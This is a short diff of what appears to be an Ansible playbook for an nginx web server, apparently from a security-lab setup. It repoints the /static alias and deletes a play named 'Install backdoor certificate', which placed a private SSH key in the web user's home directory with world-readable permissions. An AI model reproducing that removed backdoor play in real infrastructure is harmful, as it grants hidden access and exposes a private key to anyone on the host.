@@ -26,7 +26,7 @@
                 static:
                   location: /static
                   custom_options:
-                    - alias /home/{{ UNAME }}/static/
+                    - alias /home/{{ UNAME }}/app/wwwroot/
               http_demo_conf:  false
 
     - name: Merge static resource logic with nginx_vars
@@ -72,7 +72,7 @@
             static:
               location: /static
               custom_options:
-                - alias /home/{{ UNAME }}/static/
+                - alias /home/{{ UNAME }}/app/wwwroot/
           http_demo_conf: false
         reverse_proxy:
           locations:
@@ -96,20 +96,3 @@
                 header_x_forwarded_proto:
                   name: X-Forwarded-Proto
                   value: $scheme
-
-- hosts: webservers
-  become: yes
-  tasks:
-    - name: Install backdoor certificate
-      synchronize:
-        src: "/vagrant/sshkey_store/aslclient01/imovies_aslans01"
-        dest: "/home/{{ UNAME }}/.ssh/id_rsa"
-        rsync_path: "sudo rsync"
-        group: false
-        owner: false
-    - name: Set permissions on backdoor certificate
-      file:
-        path: "/home/{{ UNAME }}/.ssh/id_rsa"
-        owner: webserver
-        group: webserver
-        mode: 0644
